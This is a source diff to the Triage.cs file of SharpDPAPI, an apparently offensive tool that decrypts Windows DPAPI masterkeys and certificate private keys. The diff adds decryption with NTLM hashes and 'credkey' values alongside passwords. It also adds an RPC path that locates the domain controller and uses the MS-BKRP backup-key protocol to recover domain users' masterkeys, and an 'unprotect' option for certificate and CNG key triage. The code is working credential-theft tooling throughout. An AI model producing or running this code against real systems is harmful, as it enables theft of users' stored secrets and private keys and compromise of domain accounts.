@@ -1,7 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.DirectoryServices.ActiveDirectory;
 using System.IO;
+using System.Net;
 using System.Security.AccessControl;
+using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Xml;
@@ -10,8 +13,8 @@ namespace SharpDPAPI
 {
     public class Triage
     {
-        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", 
-            string password = "", string target = "", string userSID = "", bool dumpHash = false)
+        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes = null, bool show = false, string computerName = "", 
+            string password = "", string ntlm = "", string credkey = "", string target = "", string userSID = "", bool dumpHash = false, bool rpc = false)
         {
             // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied
             
@@ -24,8 +27,7 @@ namespace SharpDPAPI
                 // if we're targeting specific masterkey files
                 if (((backupKeyBytes == null) || (backupKeyBytes.Length == 0)) && String.IsNullOrEmpty(userSID))
                 {
-                    // currently only backupkey is supported
-                    Console.WriteLine("[X] The masterkey '/target:X' option currently requires '/pvk:BASE64...' or '/password:X'");
+                    Console.WriteLine("[X] The masterkey '/target:X' option currently requires '/pvk:BASE64...', or a SID with a /password, /ntlm, or /credkey");
                     return mappings;
                 }
 
@@ -57,9 +59,9 @@ namespace SharpDPAPI
                                 {
                                     plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                                 }
-                                else if (!String.IsNullOrEmpty(password) && !String.IsNullOrEmpty(userSID))
+                                else if (!String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(ntlm) || !String.IsNullOrEmpty(credkey))
                                 {
-                                    byte[] hmacBytes = Dpapi.CalculateKeys(password, "", true, userSID);
+                                    byte[] hmacBytes = Dpapi.CalculateKeys(password:password, ntlm:ntlm, credkey: credkey, userSID:userSID);
                                     plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                                 }
                                 else if (dumpHash)
@@ -88,9 +90,9 @@ namespace SharpDPAPI
                         {
                             plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                         }
-                        else if (!String.IsNullOrEmpty(password))
+                        else if (!String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(ntlm) || !String.IsNullOrEmpty(credkey))
                         {
-                            byte[] hmacBytes = Dpapi.CalculateKeys(password, "", true, userSID);
+                            byte[] hmacBytes = Dpapi.CalculateKeys(password: password, ntlm: ntlm, credkey: credkey, userSID: userSID);
                             plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                         }
                         else if (dumpHash)
@@ -161,11 +163,12 @@ namespace SharpDPAPI
                             {
                                 isDomain = true; // means use the NTLM of the user password instead of the SHA1
                             }
+                            userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(file);
                         }
 
-                        if (!String.IsNullOrEmpty(password))
+                        if (!String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(ntlm) || !String.IsNullOrEmpty(credkey))
                         {
-                            hmacBytes = Dpapi.CalculateKeys(password, directory, isDomain);
+                            hmacBytes = Dpapi.CalculateKeys(password: password, ntlm: ntlm, credkey: credkey, userSID: userSID, domain: isDomain);
                         }
 
                         foreach (var file in files)
@@ -185,7 +188,7 @@ namespace SharpDPAPI
                             try
                             {
                                 KeyValuePair<string, string> plaintextMasterKey = default;
-                                if (!String.IsNullOrEmpty(password))
+                                if (!String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(ntlm) || !String.IsNullOrEmpty(credkey))
                                 {
                                     plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                                 }
@@ -195,8 +198,23 @@ namespace SharpDPAPI
                                 }
                                 else if (dumpHash)
                                 {
-                                    userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(file);
+                                    userSID = Dpapi.ExtractSidFromPath(file);
                                     plaintextMasterKey = Dpapi.FormatHash(masterKeyBytes, userSID, isDomain ? 3 : 1);
+                                }
+                                else if(rpc && isDomain)
+                                {
+                                    DirectoryContext mycontext = new DirectoryContext(DirectoryContextType.Domain, System.Environment.UserDomainName);
+                                    DomainController dc = DomainController.FindOne(mycontext);
+                                    IPAddress DCIPAdress = IPAddress.Parse(dc.IPAddress);
+
+                                    var bkrp = new Bkrp();
+                                    bkrp.Initialize(DCIPAdress.ToString(), System.Environment.UserDomainName);
+                                    var keyBytes = bkrp.BackuprKey(SharpDPAPI.Dpapi.GetDomainKey(masterKeyBytes));
+                                    var guid = $"{{{Encoding.Unicode.GetString(masterKeyBytes, 12, 72)}}}";
+                                    var sha1 = new SHA1Managed();
+                                    var masterKeySha1 = sha1.ComputeHash(keyBytes);
+                                    var masterKeySha1Hex = BitConverter.ToString(masterKeySha1).Replace("-", "");
+                                    mappings.Add(guid, masterKeySha1Hex);
                                 }
 
                                 if (!plaintextMasterKey.Equals(default(KeyValuePair<string, string>)))
@@ -220,7 +238,7 @@ namespace SharpDPAPI
                 }
             }
 
-            if (!String.IsNullOrEmpty(password))
+            if (show)
             {
                 if (mappings.Count == 0)
                 {
@@ -626,7 +644,7 @@ namespace SharpDPAPI
             Console.WriteLine();
         }
 
-        public static void TriageCertFile(string certFilePath, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false)
+        public static void TriageCertFile(string certFilePath, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false, bool unprotect = false)
         {
             // triage a certificate file
 
@@ -635,7 +653,7 @@ namespace SharpDPAPI
 
             try
             {
-                ExportedCertificate cert = Dpapi.DescribeCertificate(fileName, certificateBytes, MasterKeys, cng, alwaysShow);
+                ExportedCertificate cert = Dpapi.DescribeCertificate(fileName, certificateBytes, MasterKeys, cng, alwaysShow, unprotect);
 
                 if (cert.Thumbprint != "")
                 {
@@ -673,7 +691,7 @@ namespace SharpDPAPI
             }
         }
 
-        public static void TriageCertFolder(string folder, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false)
+        public static void TriageCertFolder(string folder, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false, bool unprotect = false)
         {
             // triage a specific certificate folder
             if (!Directory.Exists(folder))
@@ -690,7 +708,7 @@ namespace SharpDPAPI
                         @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")
                     )
                     {
-                        TriageCertFile(file, MasterKeys, cng, alwaysShow);
+                        TriageCertFile(file, MasterKeys, cng, alwaysShow, unprotect);
                     }
                 }
             }
@@ -734,7 +752,7 @@ namespace SharpDPAPI
             }
         }
 
-        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "", bool showall = false)
+        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "", bool showall = false, bool unprotect = false)
         {
             string[] userDirs;
             if (!String.IsNullOrEmpty(computerName))
@@ -778,7 +796,7 @@ namespace SharpDPAPI
 
                 foreach (var directory in directories)
                 {
-                    TriageCertFolder(directory, MasterKeys, false, showall);
+                    TriageCertFolder(directory, MasterKeys, false, showall, unprotect);
                 }
 
                 var userCngKeysPath = $"{dir}\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\";
@@ -786,7 +804,7 @@ namespace SharpDPAPI
                 if (!Directory.Exists(userCngKeysPath))
                     continue;
 
-                TriageCertFolder(userCngKeysPath, MasterKeys, true, showall);
+                TriageCertFolder(userCngKeysPath, MasterKeys, true, showall, unprotect);
             }
         }
 
